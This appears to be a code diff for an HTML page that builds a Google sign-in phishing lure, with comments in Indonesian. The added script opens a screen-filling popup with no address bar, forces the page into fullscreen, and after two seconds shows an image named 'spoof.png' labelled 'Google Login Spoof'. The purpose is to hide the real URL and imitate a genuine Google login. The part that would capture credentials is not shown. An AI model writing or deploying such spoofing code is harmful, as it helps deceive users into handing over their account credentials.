@@ -4,28 +4,84 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, user-scalable=no">
     <title>URL TESTING WEBVIEW</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            width: 100%;
+            overflow: hidden;
+            background: #fff; /* Awalnya putih kosong */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        #spoof-img {
+            display: none; /* Awalnya disembunyikan */
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+        .signin-link {
+            padding: 20px 40px;
+            background: #4285f4;
+            color: white;
+            font-size: 18px;
+            text-decoration: none;
+            border-radius: 4px;
+            cursor: pointer;
+            z-index: 10;
+        }
+    </style>
     <script>
+        function goFullscreen() {
+            var elem = document.documentElement;
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen();
+            } else if (elem.webkitRequestFullscreen) {
+                elem.webkitRequestFullscreen();
+            } else if (elem.mozRequestFullScreen) {
+                elem.mozRequestFullScreen();
+            } else if (elem.msRequestFullscreen) {
+                elem.msRequestFullscreen();
+            }
+        }
+
         function openWin() {
-            // Buka popup hampir fullscreen (ukuran layar penuh, tanpa toolbar)
+            // Buka popup hampir fullscreen
             var params = 'width=' + screen.width +
                          ',height=' + screen.height +
                          ',top=0,left=0' +
-                         ',fullscreen=no' +  // Tidak pakai yes, karena diblokir
                          ',menubar=no,toolbar=no,location=no,status=no,scrollbars=no,resizable=no';
 
             var win = window.open("opener.html", "google_signin", params);
-
             if (win) {
-                win.moveTo(0, 0);  // Pastikan posisi di kiri atas
+                win.moveTo(0, 0);
+                win.resizeTo(screen.width, screen.height);
                 win.focus();
             }
+
+            // Langsung coba fullscreen di main window
+            goFullscreen();
+
+            // Delay 2 detik: tampilkan spoof.png dan coba fullscreen lagi
+            setTimeout(function() {
+                document.getElementById('spoof-img').style.display = 'block';
+                goFullscreen(); // Coba fullscreen lagi setelah gambar muncul
+            }, 2000);
         }
     </script>
 </head>
 <body>
-    <center>
-        <br>
-        <h1><a href="#" onclick="openWin(); return false;">Click here to sign in into your Google Account</a></h1>
-    </center>
+    <!-- Tombol awal -->
+    <a href="#" class="signin-link" onclick="openWin(); return false;">
+        Click here to sign in into your Google Account
+    </a>
+
+    <!-- spoof.png akan muncul setelah 2 detik -->
+    <img id="spoof-img" src="spoof.png" alt="Google Login Spoof">
 </body>
 </html>
